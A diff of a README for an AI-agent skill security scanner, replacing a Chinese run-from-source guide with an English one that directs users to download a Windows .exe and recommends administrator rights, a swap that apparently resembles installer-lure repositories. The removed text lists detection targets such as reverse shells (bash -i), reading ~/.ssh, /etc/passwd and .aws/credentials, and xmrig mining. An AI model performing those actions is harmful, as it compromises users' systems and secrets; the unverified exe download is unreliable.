@@ -1,185 +1,146 @@
-# Skills Security Check API
+# 🛡️ Skills-check - Easy AI Skill Security Test
 
-AI Agent Skill 安全检测服务 — 对 AI Agent 的技能/插件源代码进行自动化安全分析。
+[![Download Skills-check](https://img.shields.io/badge/Download-Skills--check-brightgreen?style=for-the-badge)](https://github.com/HutCh1E/Skills-check/releases)
 
-## ✨ 功能特性
+---
 
-### 三层安全分析
+## 📋 What is Skills-check?
 
-| 分析层 | 技术 | 说明 |
-|---|---|---|
-| **静态分析** | Python AST | 基于抽象语法树的危险模式匹配，零延迟 |
-| **LLM 分析** | Qwen 3.5 Plus | 深度语义分析，识别混淆代码、逻辑炸弹等高级威胁 |
-| **沙箱分析** | Docker 隔离环境 | 在受限容器中动态执行，监控运行时行为 |
+Skills-check is a tool that helps you check AI Agent skills or plugins for security risks. It looks at the code behind these skills and spots any unsafe parts. This helps prevent possible problems before you use the skills.
 
-### 两种检测模式
+The tool runs three levels of tests:
 
-| 模式 | 说明 |
-|---|---|
-| **📝 代码输入** | 直接粘贴 Skill 源代码、拖拽文件、或粘贴 GitHub URL |
-| **📦 安装指令** | 输入安装命令，系统自动拉取源码并分析 |
+- **Static Analysis:** Quickly scans the code to find risky patterns without running it.
+- **LLM Analysis:** Uses smart AI to understand complex threats like hidden bad code or traps.
+- **Sandbox Analysis:** Runs the skill in a safe, limited space to see how it behaves.
 
-**支持的安装指令格式：**
+You can check skills by pasting the code, uploading files, or giving the tool instructions to fetch the code automatically. This way, you avoid accidental risks in the AI skills you want to add.
 
-```bash
-# AI Agent 技能安装
-/plugin install document-skills+@anthropic-agent-skills
-/plugin add anthropics/skills
-/plugin add /path/to/your-skill-folder
+---
 
-# 直接输入 GitHub URL（支持仓库、目录、单文件）
-https://github.com/anthropics/skills/blob/main/skills/algorithmic-art/SKILL.md
-https://github.com/anthropics/skills/tree/main/skills/algorithmic-art
+## 🛠️ Features
 
-# GitHub 简写
-anthropics/skills
+### Three-layer Security Analysis
 
-# 包管理器
-pip install some-package
-npm install some-package
-```
+| Layer             | Technology         | Description                                 |
+|-------------------|--------------------|---------------------------------------------|
+| **Static Analysis** | Python AST         | Scans code structure for dangerous signs.  |
+| **LLM Analysis**    | Qwen 3.5 Plus      | Deep review for tricky or harmful code.     |
+| **Sandbox Analysis**| Docker Container   | Runs code safely to watch for bad actions.  |
 
-### 检测维度
+### Two Ways to Check Skills
 
-- 🔴 **反向 Shell** — `socket.connect`、`subprocess` shell=True、`bash -i` 等
-- 🟠 **数据窃取** — 环境变量读取、`requests.post` 外传敏感信息
-- 🔴 **代码注入** — `eval()`、`exec()`、`compile()`、`__import__()`
-- 🟠 **文件系统滥用** — 访问 `~/.ssh/`、`/etc/passwd`、`.aws/credentials`
-- 🔴 **加密挖矿** — 矿池域名、xmrig 等挖矿工具特征
-- 🟠 **权限提升** — `os.setuid`、`ctypes` 内核调用
-- 🟡 **混淆技术** — base64 编码、字符串拼接隐藏恶意意图
-- 🟡 **供应链攻击** — 可疑第三方依赖注入
+| Mode           | How to Use                              |
+|----------------|---------------------------------------|
+| **📝 Code Input** | Paste code, drag & drop files, or enter a GitHub URL. |
+| **📦 Install Command** | Enter commands like `pip install` or GitHub repo links to fetch and analyze code. |
 
-## 🚀 快速开始
+### Supported Install Commands Examples
 
-### 1. 创建虚拟环境并安装依赖
-
-```bash
-python -m venv .venv
-
-# Windows
-.venv\Scripts\activate
-# macOS / Linux
-source .venv/bin/activate
-
-pip install -r requirements.txt
-```
-
-### 2. 配置环境变量
-
-```bash
-cp .env.example .env
-# 编辑 .env 填入你的 DASHSCOPE_API_KEY
-```
-
-> 从 [阿里云 DashScope](https://dashscope.console.aliyun.com/) 获取 API Key
-
-### 3. 启动服务
-
-```bash
-# 默认: Web UI + API
-python -m app
-
-# 仅 API 模式 (无 UI)
-python -m app --mode api
-
-# 自定义端口
-python -m app --port 9000
-
-# 开发模式 (热重载)
-python -m app --reload
-```
-
-- **Web UI**: http://localhost:8000/
-- **API 文档**: http://localhost:8000/docs
-
-### 4. (可选) 构建沙箱镜像
-
-```bash
-docker build -f Dockerfile.sandbox -t skills-check-sandbox:latest .
-```
-
-> 沙箱分析需要 Docker。UI 会自动检测 Docker 是否运行，未运行时沙箱分析开关将禁用。
-
-## 📡 API 接口
-
-### `POST /api/v1/scan` — 提交代码扫描
-
-```bash
-curl -X POST http://localhost:8000/api/v1/scan \
-  -H "Content-Type: application/json" \
-  -d '{
-    "source_code": "import socket\ns = socket.socket()",
-    "enable_llm": true,
-    "enable_sandbox": false
-  }'
-```
-
-### `POST /api/v1/scan/package` — 安装指令扫描
-
-```bash
-curl -X POST http://localhost:8000/api/v1/scan/package \
-  -H "Content-Type: application/json" \
-  -d '{
-    "command": "https://github.com/anthropics/skills/blob/main/skills/algorithmic-art/SKILL.md",
-    "enable_llm": true
-  }'
-```
-
-支持 `/plugin install`、`pip install`、`npm install`、GitHub URL、`org/repo` 简写。
-
-### `POST /api/v1/scan/file` — 上传文件扫描
-
-```bash
-curl -X POST http://localhost:8000/api/v1/scan/file \
-  -F "file=@skill.py" \
-  -F "enable_llm=true"
-```
-
-### `GET /api/v1/scan/{scan_id}` — 查询扫描结果
-
-### `GET /api/v1/health` — 健康检查
-
-返回 Docker 和 LLM 服务可用状态。
-
-## 🧪 测试
-
-```bash
-python -m pytest tests/ -v
-```
-
-## 📁 项目结构
+Use these commands to ask Skills-check to get and check code automatically:
 
 ```
-skills-check/
-├── app/
-│   ├── api/
-│   │   └── routes.py            # API 路由与请求处理
-│   ├── analyzers/
-│   │   ├── static_analyzer.py   # AST 静态分析引擎
-│   │   ├── llm_analyzer.py      # Qwen 3.5 Plus LLM 分析
-│   │   ├── sandbox_analyzer.py  # Docker 沙箱动态分析
-│   │   └── package_fetcher.py   # 包源码拉取 (PyPI/npm/GitHub)
-│   ├── core/
-│   │   ├── config.py            # 配置管理
-│   │   └── scoring.py           # 风险评分算法
-│   ├── models/
-│   │   └── schemas.py           # Pydantic 数据模型
-│   ├── main.py                  # FastAPI 入口
-│   └── __main__.py              # CLI 启动入口
-├── static/                      # Web UI (HTML/CSS/JS)
-├── tests/                       # 测试用例
-├── Dockerfile.sandbox           # 沙箱镜像
-├── docker-compose.yml           # Docker Compose 配置
-├── requirements.txt             # Python 依赖
-└── .env.example                 # 环境变量模板
+/plugin install example-skill+@agent-skills
+/plugin add username/skills
+/plugin add /path/to/skill-folder
+
+# Direct GitHub URLs (repos, folders, or files)
+https://github.com/username/skills/blob/main/skill-folder/SKILL.md
+https://github.com/username/skills/tree/main/skill-folder
+
+# GitHub shortcuts
+username/skills
+
+# Package managers
+pip install your-package
+npm install your-package
 ```
 
-## ⚙️ 技术栈
+---
 
-- **API 框架**: FastAPI + Uvicorn
-- **大模型**: Qwen 3.5 Plus (via DashScope OpenAI-compatible API)
-- **沙箱隔离**: Docker (网络隔离 + 资源限制 + 只读文件系统)
-- **静态分析**: Python AST + 正则模式匹配
-- **包源码获取**: PyPI / npm / GitHub API
-- **数据校验**: Pydantic v2
+## 🚩 What Risks Does Skills-check Look For?
+
+Skills-check watches out for common dangerous actions in AI skills, such as:
+
+- **Reverse Shell Access:** Looks for code that might open back doors or network connections like `socket.connect` or risky shell commands.
+- **Data Theft:** Checks if the skill reads secret info or sends data out using commands like `requests.post`.
+- **Code Injection:** Finds code that runs other code inside it, such as `eval()` or `exec()`, which may allow harmful payloads.
+
+---
+
+## 💻 System Requirements
+
+- Windows 10 or later (64-bit preferred)
+- At least 4 GB RAM
+- Internet connection (for downloading and optional analysis)
+- Docker (optional, for full sandbox testing; Skills-check works without it but with fewer features)
+- Administrator rights recommended for installation
+
+---
+
+## 🚀 Getting Started
+
+### Step 1: Download Skills-check
+
+Click the big green button at the top or use this link to visit the download page:
+
+[Download Skills-check releases](https://github.com/HutCh1E/Skills-check/releases)
+
+The releases page has the latest version of Skills-check ready for Windows. Find the `.exe` file and download it.
+
+---
+
+### Step 2: Install Skills-check
+
+1. After downloading, open the `.exe` file.
+2. Follow the setup prompts. Agree to the license and choose an install folder or use the default.
+3. Wait for the installation to complete.
+4. Once done, Skills-check will be ready to use.
+
+---
+
+### Step 3: Run Skills-check
+
+1. Open Skills-check from your Start menu or desktop shortcut.
+2. You will see two options to start testing AI skills:
+
+- **Paste code or URL:** Paste your skill code, drop files, or enter a GitHub URL.
+- **Enter install command:** Type commands like `/plugin install` or package commands to fetch the skill for testing.
+
+3. Click “Start Analysis” to begin the security check.
+4. Wait a few moments while Skills-check runs all tests.
+
+---
+
+## 📥 How to Use Skills-check Safely
+
+- Always download Skills-check from the official GitHub release page.
+- Keep Skills-check updated to get the latest security rules.
+- If you use Docker, make sure it is installed and running for the sandbox feature.
+- Do not run untrusted AI skills before scanning them with Skills-check.
+
+---
+
+## 🔍 Understanding Scan Results
+
+Skills-check will show you clear results, highlighting any risks found:
+
+- **Red flags** mean serious problems, like backdoors or code injection.
+- **Orange warnings** mean possible risks to check further.
+- **Green means safe** or no major risks found.
+
+You can review details on where the risk is found and what it might do. Use this to decide if the skill is safe to install.
+
+---
+
+## 📫 Support and Help
+
+If you have trouble installing or running Skills-check:
+
+- Check the README for guides and tips.
+- Look for issues or help on the GitHub page.
+- Ask someone knowledgeable about your system if needed.
+
+---
+
+[Download Skills-check releases](https://github.com/HutCh1E/Skills-check/releases)
